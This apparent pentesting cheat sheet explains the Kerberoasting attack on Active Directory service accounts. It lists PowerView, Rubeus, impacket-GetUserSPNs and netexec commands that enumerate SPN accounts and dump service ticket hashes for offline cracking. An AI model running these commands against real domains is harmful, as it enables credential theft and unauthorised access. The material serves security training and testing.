## What is?
`Kerberoasting` is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service. 
In other words, we need a valid domain user account and password (even the lowest privileged) or a SYSTEM (or low privileged domain account) shell on a domain-joined machine to perform the attack.

## How does it work?
When a KDC respond back with a valid TGS his message is fully encrypted with the session key shared between the user and the KDC, so the user can decrypt it because they know it. However, the embedded TGS ticket or Service Ticket (ST) is encrypted with the `service account's` secret key. The user, therefore, has `a piece of data encrypted with the service account's password`. 
A user can request a `Service Ticket (ST)` for `all` available services existing on the Active Directory environment and have those tickets `encrypted with the secret of each service account` in their possession.
Now that they have a `Service Ticket (ST)` encrypted with a service account's password, the user can perform an offline brute-force attack to try to recover the password in clear text.

## How to identify?
You want to look for accounts that holds a SPN, and to perform so you will need a valid set of credentials(low priv is enought to talkt to AD).
In windows  you can do something similar:
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainUser -SPN
```
In Linux you can still look at Bloodhound and search for Kerberoastable users, or use impacketer suite.
```
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME>
```

# Attack
## From Windows
You can get all kerberoastable users directly in Powerview.ps1.
```powershell-session
Import-Module .\PowerView.ps1
Invoke-Kerberoast
```
Or by using Rubeus.exe
```cmd-session
Rubeus.exe kerberoast /nowrap
```
## From Linux
You can use either impacketer.
```
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast -request
```
Or netexec as well.
```
netexec ldap 192.168.0.104 -u harry -p pass --kerberoast output.txt 
```
